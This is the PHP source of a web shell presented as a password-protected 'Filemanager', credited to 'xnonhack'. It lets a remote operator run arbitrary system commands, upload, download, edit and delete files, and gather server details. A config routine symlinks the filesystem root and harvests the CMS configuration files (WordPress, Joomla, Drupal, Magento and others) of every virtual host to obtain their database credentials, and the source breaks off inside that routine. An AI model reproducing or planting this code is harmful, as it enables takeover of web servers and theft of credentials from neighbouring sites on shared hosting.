<?php
date_default_timezone_set("Asia/Jakarta");
error_reporting(0);
session_start();
set_time_limit(0);
$password = '$2y$10$HI5sBrenjZyy88tGWKnCwOLnHf09C5LfLcz09Qe9ZK8M4oLBqXDrO';
function login() {
    ?>
    <title>Login</title>
    <link rel="icon" href="https://cdn.onlinewebfonts.com/svg/img_552870.png" sizes="32x32">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style type="text/css">
        @import url('https://fonts.googleapis.com/css2?family=Pangolin&display=swap');
        body {
            font-family: 'Pangolin', cursive;
            background: #343a40;
            color: #8a8a8a;
        }
        table {
            position: static;
            background: #fff;
            box-shadow: 0px 0px 0px 6px #fff;
            border-top: 0px solid #fff;
            border-bottom: 20px solid #fff;
            border-right: 20px solid #fff;
            border-left: 20px solid #fff;
            border-radius:3px;
            border-spacing:0;
        }
        th {
            padding:12px;
            font-size:30px;
            font-weight: bold;
        }
        td {
            border: 6px solid #000;
            padding:5px;
            border:none;
        }
        input {
            width:100%;
            background: #fff;
            outline: none;
            border-radius:5px;
            border: 2px solid #8a8a8a;
            color:#fff;
            padding:7px;
        }
        @media (min-width: 320px) and (max-width: 480px) {
            table {
                width:100%;
            }
        }
    </style>
    <br><br><br><br><br><br><br><br><br><br><br><br><br><br>
    <form method="post">
        <table align="center" width="20%">
            <tr>
                <thead>
                    <th>LOGIN</th>
                </thead>
            </tr>
            <tr><thead><th></th></thead></tr>
            <tbody>
                <tr>
                    <td>
                        <input type="password" name="password">
                    </td>
                </tr>
            </tbody>
        </table>
    </form>
    <?php
    exit();
}
function logout() {
    unset($_SESSION['login']);
    ?> <script>window.location='http://<?= $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'] ?>'</script> <?php
}
if (!isset($_SESSION['login'])) {
    if (empty($password) || (isset($_POST['password']) && (password_verify($_POST['password'], $password)))) {
        $_SESSION['login'] = true;
        ?> <script>window.location='?cd=<?= x::hex(str_replace($_SERVER['SCRIPT_NAME'] , '', getcwd().$_SERVER['SCRIPT_NAME'])) ?>'</script> <?php
    } else {
        login();
    }
}
?>
<head>
<link rel="icon" href="https://cdn.onlinewebfonts.com/svg/img_552870.png" sizes="32x32">
<meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flexboxgrid/6.3.1/flexboxgrid.min.css" type="text/css" >
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
<link href="https://swisnl.github.io/jQuery-contextMenu/dist/jquery.contextMenu.css" rel="stylesheet" type="text/css" />
</head>
<style type="text/css">
    @import url('https://fonts.googleapis.com/css2?family=Open+Sans&display=swap');
    @import url('https://fonts.googleapis.com/css2?family=Ubuntu:ital@1&display=swap');
    :root {
        --color-bg:#e7f3ff;
        --bg-body:#343a40;
    }
    * {
        font-family: 'Open Sans', sans-serif;
    }
    body {
        overflow: hidden;
        margin:10px;
        background: var(--bg-body);
    }
    a {
        text-decoration: none;
        color: #000;
    }
    div.container {
        margin:20px;
        width:80%;
        text-align:left;
    }
    div.header {
        border-radius:5px 5px 0px 0px;
        width:100%;
        background: #fff;
        padding-top:15px;
        padding-bottom:15px;
        border-top: 1px solid #f2f2f2;
        border-left: 1px solid #f2f2f2;
        border-right: 1px solid #f2f2f2;
    }
    span.home {
        margin-left: 10px;
        font-size:25px;
        font-weight: bold;
    }
    div.center {
        background: #fff;
        display: inline;
        overflow: hidden;
        height:500px;
        border-radius:0px 0px 5px 0px;
        padding-right: 40px;
        padding-top: 10px;
        padding-left:35px;
    }
    div.tool {
        background: #fff;
        padding-left:12px;
        width: 50px;
    }
    div.intotool {
        overflow-x: auto;
        width:99%;
        z-index: 99;
    }
    div.intool {
        width: 220%;
        padding: 11px;
    }
    div.tool a.logout {
        background:#dc3545;
        border:none;
        color: #fff;
    }
    div.tool a.logout:hover {
        background:#dd4a58;
        border:none;
    }
    div.tool a {
        z-index: 0;
        background: var(--color-bg);
        border: 1px solid #f2f2f2;
        margin:10px;
        font-weight: bold;
        display: inline;
        color: #1889f5;
        border-radius:5px;
        padding: 10px;
    }
    select:hover,
    #alertBox #closeBtn:hover,
    div.tool a:hover,
    input[type=submit]:hover {
        cursor: pointer;
        background: #dbe7f2;
        border: 1px solid #dbe7f2;
    }
    button.edit:hover,
    button.chname:hover,
    button.delete:hover,
    button.download:hover {
        cursor: pointer;
        background: #dbe7f2;
        border: 1px solid #dbe7f2;
    }
    button.edit,
    button.chname,
    button.delete,
    button.download {
        transition: all 0.35s;
        border: 1px solid #f2f2f2;
        background: var(--color-bg);
        color: #1889f5;
        font-weight: bold;
        position: relative;
        outline: none;
        float: right;
        padding:3px;
        margin: 1;
    }
    button.edit {
        width:30px;
    }
    button.chname {
        width:30px;
    }
    button.ch {
        width:63px;
    }
    button.delete {
        width:63px;
    }
    div.tool span {
        font-size:14px;
        margin: 10px;
    }
    table {
        border-spacing: 0;
    }
    tr, td {
        border-radius:5px;
        border-spacing:0;
    }
    .hover:hover {
        background: var(--color-bg);
    }
    div.dir, div.file {
        padding:1px;
    }
    span.author {
        font-size: 10px;
        position: fixed;
        margin:2px;
        margin-top:20px;
        color: #cfcfcf;
        font-family: 'Ubuntu', sans-serif;
    }
    span.p {
        position: fixed;
        margin:2px;
        margin-top: 10px;
    }
    div.info {
        display: inline-block;
        width:100px;
        padding:3px;
        float: right;
        text-align: center;
    }
    div.button button {
        padding: 7px 15px;
        border: 1px solid #f2f2f2;
        border-radius: 5px;
        background: var(--color-bg);
        color: #1889f5;
        font-weight: bold;
        outline: none;
    }
    div.button button:hover {
        cursor: pointer;
    }
    select {
        background: var(--color-bg);
        border: 1px solid #f2f2f2;
        padding:7px;
        border-radius: 120px;
        color: #1889f5;
        outline: none;
        width:35px;
        -moz-appearance: none;
        -webkit-appearance: none;
    }
    div.edit,
    div.upload,
    div.createfile,
    div.chname,
    div.addfiles,
    div.preview,
    div.infos,
    div.make {
        width:100%;
    }
    div.edit {
        height: 423px;
    }
    div.createfile,
    div.upload,
    div.chname,
    div.addfiles,
    div.preview,
    div.infos,
    div.edit {
        padding:35px 15px 10px 10px 5px;
        padding:15px;
        width:95%;
        border-radius:7px;
        background:#fff;
        border:1px solid #e0e0e0;
        box-shadow: 0 0px 1.5px rgba(0,0,0,0.15), 0 0px 1.5px rgba(0,0,0,0.16);
    }
    div.upload {
        height:490px;
        overflow: hidden;
    }
    div.infos {
        height:422px;
        overflow: auto;
    }
    div.cs {
        border-radius:0px 0px 0px 5px;
    }
    div.filemanager {
        padding:10px;
        padding-left:20px;
        padding-bottom: 2px;
    }
    div.files {
        padding:35px 15px 10px 10px 5px;
        padding:15px;
        width:95%;
        border-radius:7px;
        overflow: auto;
        background:#fff;
        border:1px solid #e0e0e0;
        box-shadow: 0 0px 1.5px rgba(0,0,0,0.15), 0 0px 1.5px rgba(0,0,0,0.16);
    }
    div.infiles {
        height:385px;
        overflow: auto;
    }
    .count,
    div.pwd {
        background: var(--color-bg);
        border: 1px solid #f2f2f2;
        font-size:10px;
        padding: 10px;
        color: #1889f5;
        font-weight: bold;
        border-radius:5px;
    }
    a.pwd {
        color: #1889f5;
    }
    div.chname span,
    div.edit span {
        font-weight: bold;
        text-align: left;
    }
    .block {
        clear: both;
        min-height: 50px;
        border-top: solid 1px #ECE9E9;
    }
    .block:first-child {
        border: none;
    }
    .block .img img {
        width: 50px;
        height: 50px;
        display: block;
        float: left;
        margin-right: 10px;
    }
    .block .date {
        margin-top: 4px;
        font-size: 70%;
        color: #666;
    }
    .block a {
        border-radius:5px;
        display: block;
        padding: 10px 15px;
        transition: all 0.35s;
    }
    .block a:hover {
        text-decoration: none;
        background: #efefef;
    }
    audio {
        outline: none;
        width:230px;
        border: none;
        border-radius:5px;
    }
    video {
        outline: none;
        width:100%;
        height: auto;
        border: none;
        border-radius:5px;
    }
    textarea {
        border: 1px solid #f2f2f2;
        background: #f0f2f5;
        outline: none;
        padding:20px;
        resize: none;
        width: 100%;
        height:160px;
        border-radius:5px;
    }
    td.action {
        font-size:25px;
        font-weight: bold;
    }
    td.files {
        width:400px;
    }
    .dir,
    span.file {
        margin:7px;
        margin-top: 5px;
    }
    td.size {
        width:85px;
        text-align: right;
        padding:7px;
    }
    td.edit-header {
        padding-bottom: 20px;
    }
    input[type=submit] {
        width:100%;
        font-weight: bold;
        border-radius:5px;
        background: var(--color-bg);
        padding:7px;
        outline:none;
        border: 1px solid #f2f2f2;
        color: #1889f5;
    }
    input[type=text] {
        width:100%;
        background: #f0f2f5;
        outline: none;
        border-radius:5px;
        border: 1px solid #f2f2f2;
        padding:7px;
    }
    table.infos {
        border-collapse: collapse;
        border-spacing: 0;
    }
    table.upload td,
    table.infos td,
    table.createfile td,
    table.chname td,
    table.addfiles td,
    table.preview td,
    table.edit td {
        padding:7px;
    }
    .icons {
        margin-top:5px;
        width:24px;
        height:24px;
    }
    a.alert {
        font-weight: bold;
        color: #1889f5;
    }
    .filename, .textarea, .submit {
        padding:3px;
    }
    ::-webkit-scrollbar {
        display: none;
    }
    ::-webkit-scrollbar-track {
        background: blue;
    }
    ::-webkit-scrollbar-thumb {
        background: var(--color-bg);
        border-radius:0;
    }
    ::-webkit-scrollbar-thumb:hover {
        background: #dfeaf5;
    }
    td.img {
        width:1%;
    }
    td.act {
        width:10%;
    }
    .size {
        float: right;
    }
    .perms {
        text-align: center;
    }
    div.role {
        padding: 3px;
        height:370px;
        overflow: auto;
    }
    div.role td {
        padding:4px;
    }
    div.alert .success {
        background: #deffd9;
        padding:10px;
        color:#90b38b;
        border-radius: 5px;
    }
    div.alert span {
        float: right;
    }
    textarea.preview {
        padding:0;
        height:390px;
        border: none;
        background: none;
    }
    input[type=text].search {
        width:500px;
        float: right;
        margin-right:15px;
    }
    textarea::placeholder {
        color: red;
        opacity: 1;
    }
    textarea:-ms-input-placeholder {
        color: red;
    }
    textarea::-ms-input-placeholder {
        color: red;
    }
    .second {
        display: none;
    }
    #modalContainer {
        background-color:rgba(0, 0, 0, 0.3);
        position:absolute;
        width:100%;
        height:100%;
        top:0px;
        left:0px;
        z-index:10000;
    }

    #alertBox {
        position:relative;
        width:300px;
        min-height:165px;
        padding:10px;
        border-radius:10px;
        margin-top:50px;
        background-color:#fff;
        background-repeat:no-repeat;
        background-position:20px 30px;
    }

    #modalContainer > #alertBox {
        position:fixed;
    }

    #alertBox h1 {
        margin:0;
        font-family: 'Open Sans', sans-serif;
        color:#000;
        border-bottom: 1px solid rgba(222,222,222,0.73);
        border-radius: 10px 10px 00px 0px;
        padding:10px 0 10px 15px;
    }

    #alertBox p {
        font-family: 'Open Sans', sans-serif;
        height:50px;
        margin-left:16px;
    }

    #alertBox #closeBtn {
        display:block;
        position:relative;
        margin:5px auto;
        outline:none;
        padding:7px 100px;
        border-radius:7px;
        width:70px;
        font-family: 'Open Sans', sans-serif;
        text-transform:uppercase;
        text-align:center;
        color: #1889f5;
        border: 1px solid var(--color-bg);
        background-color:var(--color-bg);
        text-decoration:none;
    }
    .navbar {
        display: none;
        border: none;
        width: 92%;
        position: fixed;
        margin-top: -35px;
        padding:20px;
    }
    #submit {
        float: right;
        width: 150px;
    }
    div.up {
        width: 100%;
    }
    p.list {
        padding: 10px;
        margin: 13px;
        font-size:20px;
    }
    a.menu:hover {
        cursor: pointer;
    }
    #submit,
    #upload {
        position: relative;
        font-family: 'Open Sans', sans-serif;
        width: 150px;
        padding: 10px;
        -webkit-border-radius: 5px;
        -moz-border-radius: 5px;
        background: var(--color-bg);
        border: 1px solid #f2f2f2;
        text-align: center;
        color: #1889f5;
        font-weight: bold;
        cursor: pointer;
    }
    .navbar a {
        z-index: 0;
        background: var(--color-bg);
        border: 1px solid #f2f2f2;
        margin:10px;
        overflow: auto;
        font-weight: bold;
        display: block;
        color: #1889f5;
        border-radius:5px;
        padding: 10px;
    }
    .navbar .icon {
        display: none;
     }
    .blocker {
        position: fixed;
        top: 0; right: 0; bottom: 0; left: 0;
        width: 100%; height: 100%;
        overflow: auto;
        z-index: 1;
        padding: 20px;
  box-sizing: border-box;
  text-align: center;
}
.blocker:before{
  content: "";
  display: inline-block;
  height: 100%;
  vertical-align: middle;
  margin-right: -0.05em;
}
.blocker.behind {
  background-color: transparent;
}
.modal {
  display: none;
  vertical-align: middle;
  position: relative;
  z-index: 2;
  max-width: 500px;
  box-sizing: border-box;
  width: 90%;
  background: #fff;
  padding: 15px 30px;
  -webkit-border-radius: 5px;
  -moz-border-radius: 5px;
  -o-border-radius: 5px;
  -ms-border-radius: 5px;
  border-radius: 5px;
  box-shadow: 0 3px 6px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
  text-align: left;
}
.modal .title {
    padding-bottom:10px;
    font-size:25px;
    font-weight: bold;
}
.modal .filename {
    text-align: left;
    font-weight:bold;
}
.modal button {
    display: block;
    width:100%;
    text-align: left;
    margin-bottom: 2px;
    border-radius:5px;
    border:none;
    font-size: 18px;
    font-size:15px;
    outline: none;
    background: none;
    padding:10px;
}
.modal button:hover {
    cursor: pointer;
    background: #efefef;
}
.modal a.close-modal {
  position: absolute;
  top: 10px;
  right: 10px;
  display: block;
  width: 30px;
  border-radius:50px;
  height: 30px;
  padding:5px;
  text-indent: -9999px;
  background-size: 30px;
  background-repeat: no-repeat;
  background-position: center center;
  background-image: url('https://www.freeiconspng.com/uploads/close-button-png-27.png');

}
.modal a.close-modal:hover {
    background-color: #efefef;
}
.modal img {
    border-radius:5px;
    max-width: 100%;
    height: auto;
}
.modal-spinner {
  display: none;
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translateY(-50%) translateX(-50%);
  padding: 12px 16px;
  border-radius: 5px;
  background-color: #111;
  height: 20px;
}

.modal-spinner > div {
  border-radius: 100px;
  background-color: #fff;
  height: 20px;
  width: 2px;
  margin: 0 1px;
  display: inline-block;

  -webkit-animation: sk-stretchdelay 1.2s infinite ease-in-out;
  animation: sk-stretchdelay 1.2s infinite ease-in-out;
}

.modal-spinner .rect2 {
  -webkit-animation-delay: -1.1s;
  animation-delay: -1.1s;
}

.modal-spinner .rect3 {
  -webkit-animation-delay: -1.0s;
  animation-delay: -1.0s;
}

.modal-spinner .rect4 {
  -webkit-animation-delay: -0.9s;
  animation-delay: -0.9s;
}

@-webkit-keyframes sk-stretchdelay {
  0%, 40%, 100% { -webkit-transform: scaleY(0.5) }
  20% { -webkit-transform: scaleY(1.0) }
}

@keyframes sk-stretchdelay {
  0%, 40%, 100% {
    transform: scaleY(0.5);
    -webkit-transform: scaleY(0.5);
  }  20% {
    transform: scaleY(1.0);
    -webkit-transform: scaleY(1.0);
  }
}
    @media (min-width: 320px) and (max-width: 480px) {
        body {
            margin:0;
            overflow: hidden;
        }
        * {
            font-size: 12px;
        }
        button.delete {
        }
        .navbar {
            display: block;
        }
        div.container {
            margin: -20;
            width:130%;
        }
        .size, .perms {
            display: none;
        }
        td.act {
            width:13%;

        }
        .display {
            display: none;
        }
        select {
            -moz-appearance: none;
            -webkit-appearance: none;
            padding: 2px 2px;
        }
        div.header {
            padding-top: 5px;
            position: center;
            box-shadow: 0 0px 1.5px rgba(0,0,0,0.15), 0 0px 1.5px rgba(0,0,0,0.16);
            border-radius: 5px;
            background: #fff;
        }
        .cs {
            width:100%;
        }
        div.center {
            margin-top: -25px;
            overflow: hidden;
            background: none;
            display;
            height:700px;
        }
        .navbar a {
            display: none;
        }
        .navbar a.icon {
            float: right;
            margin-top:30px;
            margin-right: 107px;
            width:auto;
            display: block;
            position: fixed;
            right: 0;
            top: 0;
        }
        div.raw {
            padding:20px;
        }
        span.home {
            margin-bottom: 20px;
        }
        .navbar.responsive {position: relative;}
        .navbar.responsive .icon {
            position: fixed;
            margin-top:30px;
            width:auto;
            right: 0;
            top: 0;
        }
        }
        .navbar.responsive a {
            float: none;
            display: block;
            width:76%;
            text-align: left;
        }
        ::-webkit-scrollbar {
            width:0;
        }
        ::-webkit-scrollbar-track {
        }
        ::-webkit-scrollbar-thumb {
            background: none;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #dfeaf5;
        }
    }
</style>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script src="https://swisnl.github.io/jQuery-contextMenu/dist/jquery.contextMenu.js" type="text/javascript"></script>
<script src="https://swisnl.github.io/jQuery-contextMenu/dist/jquery.ui.position.min.js" type="text/javascript"></script>
<script type='text/javascript'>
    var alert_TITLE = "Alert";
    var alert_BUTTON_TEXT = "Ok";

    if(document.getElementById) {
        window.alert = function(txt) {
            createCustomalert(txt);
        }
    }
    function createCustomalert(txt) {
        d = document;
        if(d.getElementById("modalContainer")) return;
        mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
        mObj.id = "modalContainer";
        mObj.style.height = d.documentElement.scrollHeight + "px";
        alertObj = mObj.appendChild(d.createElement("div"));
        alertObj.id = "alertBox";
        if(d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
        alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth)/2 + "px";
        alertObj.style.visiblity="visible";
        h1 = alertObj.appendChild(d.createElement("h1"));
        h1.appendChild(d.createTextNode(alert_TITLE));
        msg = alertObj.appendChild(d.createElement("p"));
        msg.innerHTML = txt;
        btn = alertObj.appendChild(d.createElement("a"));
        btn.id = "closeBtn";
        btn.appendChild(d.createTextNode(alert_BUTTON_TEXT));
        btn.href = "#";
        btn.focus();
        btn.onclick = function() { removeCustomalert();return false; }
        alertObj.style.display = "block";
    }
    function removeCustomalert() {
        document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
    }
    function getFile() {
        document.getElementById("upfile").click();
    }

    function sub(obj) {
        var file = obj.value;
        var fileName = file.split("\\");
        document.getElementById("upfile").innerHTML = fileName[fileName.length - 1];
        document.myForm.submit();
        event.preventDefault();
    }

    // Title Typing
    title = "-/-\\--";
    position = 0;
    function scrolltitle() {
        document.title = title.substring(position, title.length) + title.substring(0, position);
        position++;
        if (position > title.length) position = 0;
        titleScroll = window.setTimeout(scrolltitle,170);
}
scrolltitle();
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script type="text/javascript">
    $('#upfile').change(function() {
        $('#myForm').submit();
    });
</script>
<script type="text/javascript">
    updateList = function() {
        var input = document.getElementById('upfile');
        var output = document.getElementById('fileList');
        var children = "";
        for (var i = 0; i < input.files.length; ++i) {
            children += '<li>' + input.files.item(i).name + '</li>';
        } output.innerHTML = '<p class=list>File selected</p><ul>'+children+'</ul>';
}
</script>
<script>
function filterTable() {
    var input, filter, table, tr, td, i;
    input = document.getElementById("Input");
    filter = input.value.toUpperCase();
    table = document.getElementById("myTable");
    tr = table.getElementsByTagName("tr");
    for (i = 0; i < tr.length; i++) {
        td = tr[i].getElementsByTagName("td")[0];
        if (td) {
            if (td.innerHTML.toUpperCase().indexOf(filter) > -1) {
                tr[i].style.display = "";
            } else {
                tr[i].style.display = "none";
            }
        }
    }
}
</script>
<center>
<div class="container">
    <div class="row raw">
        <div class="header">
            <div class="filemanager">
                <span class="home">
                    Filemanager
                    <a href="https://www.facebook.com/xnonhack/" target="_blank">
                        <span class="author p">author</span>
                        <span class="author">xnonhack</span>
                    </a>
                </span>
                <input class="search" type="text" id="Input" onkeyup="filterTable()" placeholder="Search for files..." title="Type in a name">
                <noscript><style>#Input{display:none}</style></noscript>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-xs-12 tool">
            <div class="intotool">
                <div class="intool">
                <a href="?cd=<?= x::hex(str_replace($_SERVER['SCRIPT_NAME'] , '', getcwd().$_SERVER['SCRIPT_NAME'])) ?>">
                <i class="fa fa-home" aria-hidden="true"></i>
                <span>Home</span>
            </a>
            <a href="?cd=<?= $_GET['cd'] ?>&terminal">
                <i class="fa fa-terminal" aria-hidden="true"></i>
                <span>Terminal</span>
            </a>
            <a href="?cd=<?= $_GET['cd'] ?>&addfiles">
                <i class="fa fa-plus-square" aria-hidden="true"></i>
                <span>Add File</span>
            </a>
            <a href="?cd=<?= $_GET['cd'] ?>&addfolder">
                <i class="fa fa-folder" aria-hidden="true"></i>
                <span>Add Folder</span>
            </a>
            <a href="?cd=<?= $_GET['cd'] ?>&upload">
                <i class="fa fa-upload"></i>
                <span>Upload</span>
            </a>
            <a href="?cd=<?= $_GET['cd'] ?>&config">
                <i class="fa fa-cogs"></i>
                <span>Config</span>
            </a>
            <a href="?cd=<?= x::hex(x::cwd()) ?>&adminer">
                <i class="fa fa-user"></i>
                <span>Adminer</span>
            </a>
            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
                <i class="fa fa-exclamation-triangle"></i>
                <span>Jumping</span>
            </a>
            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
                <i class="fa fa-exclamation-circle"></i>
                <span>Symlink</span>
            </a>
            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
                <i class="fas fa-network-wired"></i>
                <span>Network</span>
            </a>
            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
                <i class="fa fa-exclamation-triangle"></i>
                <span>Replace</span>
            </a>
            <a href="https://t.me/BHSec" target="_blank">
                <i class="fa fa-users" aria-hidden="true"></i>
                <span>Join Us</span>
            </a>
            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
                <i class="fa fa-bug" aria-hidden="true"></i>
                <span>CP Reset</span>
            </a>
            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
                <i class="fa fa-info"></i>
                <span>About me</span>
            </a>
            <a href="?logout" class="logout">
                <i class="fa fa-power-off" aria-hidden="true"></i>
                <span>Logout</span>
            </a>
            </div>
            </div>
        </div>
    </div>
    <?php
    class x {
        public static $cwd;
        public static $path;
        public static $link;
        public static $angka;
        public static $result;
        public static $handle;
        public static $extension;
        public static function cwd() {
            return str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
        }
        public static function cd($directory) {
            return @chdir($directory);
        }
        public static function files($type) {
            $result = array();
            foreach (scandir(self::cwd()) as $key => $value) {
                $file['name'] = self::cwd() . DIRECTORY_SEPARATOR . $value;
                switch ($type) {
                    case 'dir':
                        if (!is_dir($file['name']) || $value === '.' || $value === '..') continue 2;
                        break;
                    case 'file':
                        if (!is_file($file['name'])) continue 2;
                        break;
                }
                $file['link']   = self::hex($file['name']);
                $file['size']   = (is_dir($file['name'])) ? self::countDir($file['name']). " items" : x::size($file['name']);
                $file['perms']  = x::w__($file['name'], x::perms($file['name']));
                $result[] = $file;
            } return $result;
        }
        public static function total($dir, $type) {
            if (glob($dir . "/*") != false) {
                switch ($type) {
                    case 'all':
                        return count(glob($dir . "/*"));
                        break;
                }
            }

        }
        public static function save($filename = null, $data, $type) {
            switch ($type) {
                case 'save':
                    self::$handle = fopen($filename, "w");
                    fwrite(self::$handle, $data);
                    fclose(self::$handle);
                    break;
                case 'makefile':
                    self::$handle = fopen($filename, "w");
                    fwrite(self::$handle, $data);
                    fclose(self::$handle);
                    break;
                case 'makedir':
                    return mkdir($filename, 0777);
                    break;
            }
        }
        public static function featureShell($cmd, $cwd) {
            $stdout = array();
            if (preg_match("/^\s*cd\s*$/", $cmd)) {
            } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
                chdir($cwd);
                preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
                chdir($match[1]);
            } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
                chdir($cwd);
                preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
                return featureDownload($match[1]);
            } else {
                chdir($cwd);
                exec($cmd, $stdout);
            } return array(
                "stdout" => $stdout,
                "cwd" => getcwd()
            );
        }
        public static function featurePwd() {
            return array("cwd" => getcwd());
        }
        public static function featureHint($fileName, $cwd, $type) {
            chdir($cwd);
            if ($type == 'cmd') {
                $cmd = "compgen -c $fileName";
            } else {
                $cmd = "compgen -f $fileName";
            }
            $cmd = "/bin/bash -c \"$cmd\"";
            $files = explode("\n", shell_exec($cmd));
            return array(
                'files' => $files,
            );
        }
        public static function featureDownload($filePath) {
            $file = @file_get_contents($filePath);
            if ($file === FALSE) {
                return array(
                    'stdout' => array('File not found / no read permission.'),
                    'cwd' => getcwd()
                );
            } else {
                return array(
                    'name' => basename($filePath),
                    'file' => base64_encode($file)
                );
            }
        }
        public static function featureUpload($path, $file, $cwd) {
            chdir($cwd);
            $f = @fopen($path, 'wb');
            if ($f === FALSE) {
                return array(
                    'stdout' => array('Invalid path / no write permission.'),
                    'cwd' => getcwd()
                );
            } else {
                fwrite($f, base64_decode($file));
                fclose($f);
                return array(
                    'stdout' => array('Done.'),
                    'cwd' => getcwd()
                );
            }
        }
        public static function getextension($filename) {
            return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        }
        public static function pwd() {
            self::$path = explode(DIRECTORY_SEPARATOR, self::cwd());
            self::$result = '';
            foreach (self::$path as $key => $value) {
                if ($value == '' && $key == 0) {
                    self::$result = "<a class='pwd' href='?cd=".self::hex(DIRECTORY_SEPARATOR)."'>".DIRECTORY_SEPARATOR."</a>";
                    continue;
                } if ($value == '') continue;
                self::$result .= "<a class='pwd' href='?cd=";
                self::$link = '';
                for ($i=0; $i < $key ; $i++) {
                    self::$link .= self::$path[$i];
                    if ($i != $key) self::$link .= DIRECTORY_SEPARATOR;
                }
                self::$result .= self::hex(self::$link);
                self::$result .= "'>{$value}</a>".DIRECTORY_SEPARATOR."";
            } return self::$result;
        }
        public static function perms($filename) {
            return substr(sprintf("%o", fileperms($filename)), -4);
        }
        public static function w__($filename, $perms) {
            if (is_writable($filename)) {
                return "<font color='green'>{$perms}</font>";
            } else {
                return "<font color='red'>{$perms}</font>";
            }
        }
        public static function formatSize( $bytes ){
            $types = array( 'Byte', 'KB', 'MB', 'GB', 'TB' );
            for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
            return( round( $bytes, 2 )." ".$types[$i] );
        }
        public static function sortname($name, $filename) {
            self::$path = basename($filename);
            switch ($name) {
                case '1':
                    if (strlen(self::$path) > 40) {
                        print(substr(self::$path, 0, 40)."...");
                    } else {
                        print(self::$path);
                    }
                    break;
                case '2':
                    if (strlen(self::$path) > 14) {
                        print(substr(self::$path, 0, 14)."...");
                    } else {
                        print(self::$path);
                    }
                    break;
            }
        }
        public static function OS() {
            return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
        }
        public static function info($info = null) {
            switch ($info) {
                case 'hdd':
                    return "Total : ". self::formatSize(disk_total_space(getcwd())) ." &nbsp;&nbsp;<br>
                            Free  : ". self::formatSize(disk_free_space(getcwd())) ."&nbsp;&nbsp;<br>
                            Persentase : [ ".(int) (disk_free_space(getcwd())/disk_total_space(getcwd())*100)."% ]";
                    break;
                case 'disable_function':
                    return (!empty(@ini_get("disable_functions"))) ? @ini_get("disable_functions") : "<font color=green>NONE</font>";
                    break;
                case 'mail':
                    return (function_exists('mail')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
                    break;
                case 'mysql':
                    return (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
                    break;
                case 'ip':
                    return getHostByName(getHostName());
                    break;
                case 'software':
                    return $_SERVER['SERVER_SOFTWARE'];
                    break;
                case 'kernel':
                    return php_uname();
                    break;
                case 'phpversion':
                    return phpversion();
                    break;
                case 'domain':
                    $d0mains = @file("/etc/named.conf", false);
                    if (!$d0mains){
                        print "<font color=red size=2px>Cant Read <i>/etc/named.conf</i></font>";
                        $GLOBALS["need_to_update_header"] = "true";
                    } else {
                        $count = 0;
                        foreach ($d0mains as $d0main){
                            if (@strstr($d0main, "zone")){
                                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                                flush();
                                if (strlen(trim($domains[1][0])) > 2){
                                    flush();
                                    $count++;
                                }
                            }
                        }
                        print $count. " Domain";
                    }
                break;
            }
        }
        public static function addfiles($filename, $data) {
            self::$handle = fopen($filename, "w");
            fwrite(self::$handle, $data);
            fclose(self::$handle);
        }
        public static function addfolder($dirname) {
            return mkdir($dirname, 0777);
        }
        public static function delete($filename) {
            if (is_dir($filename)) {
                foreach (scandir($filename) as $key => $file) {
                    if ($file != '.' && $file != '..') {
                        if (is_dir($filename . DIRECTORY_SEPARATOR . $file)) {
                            self::delete($filename . DIRECTORY_SEPARATOR . $file);
                        } else {
                            unlink($filename . DIRECTORY_SEPARATOR . $file);
                        }
                    }
                } if (rmdir($filename)) {
                    return true;
                } else {
                    return false;
                }
            } else {
                if (unlink($filename)) {
                    return true;
                } else {
                    return false;
                }
            }
        }
        public static function config($passwd) {
            mkdir(".config", 0777);
            chdir(".config");
            system("ln -s / root");
            $explode = explode("\n", $passwd);
            foreach ($explode as $pawd) {
                $pass = explode(":", $pawd);
                $user = $pass[5];
                $jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
                if (preg_match('/vhosts/i', $user)) {
                    system("ln -s ".$user."/httpdocs/wp-config.php ".$jembod."-Wordpress.txt");
                    system("ln -s ".$user."/httpdocs/configuration.php ".$jembod."-Joomla.txt");
                    system("ln -s ".$user."/httpdocs/config/koneksi.php ".$jembod."-Lokomedia.txt");
                    system("ln -s ".$user."/httpdocs/forum/config.php ".$jembod."-phpBB.txt");
                    system("ln -s ".$user."/httpdocs/sites/default/settings.php ".$jembod."-Drupal.txt");
                    system("ln -s ".$user."/httpdocs/config/settings.inc.php ".$jembod."-PrestaShop.txt");
                    system("ln -s ".$user."/httpdocs/app/etc/local.xml ".$jembod."-Magento.txt");
